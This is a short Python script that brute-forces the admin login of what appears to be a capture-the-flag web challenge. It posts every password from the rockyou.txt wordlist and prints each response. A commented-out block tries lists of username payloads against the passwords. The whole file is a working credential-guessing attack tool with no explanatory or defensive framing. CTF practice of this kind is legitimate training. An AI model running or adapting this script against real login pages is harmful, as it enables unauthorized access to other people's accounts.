#!/usr/bin/python3 

#error while reading the pass file 


from sys import argv

import requests

url = "https://webexploit.freedomctf.org/_/sqli1/login/"

def logIn(username,password):
	req = requests.post(url,data={
		"username":username,
		"password":password,
		"submit": "Login",
		})
	return req

# with open("payloads",'r') as f:
# 	usernames = [line.strip() for line in f.read().split("\n") ]

#print(usernames)
with open("/usr/share/wordlists/rockyou.txt",'r') as f:
	passwords = [line.strip() for line in f.read().split("\n") ]

# for username in usernames:
# 	for password in passwords:
# 		response = logIn(username,password).text
# 		print(f"username:{username}:{password}->{response}")


for password in passwords:
	response = logIn("admin",password).text
	print(f"{password}$$\n{response}")


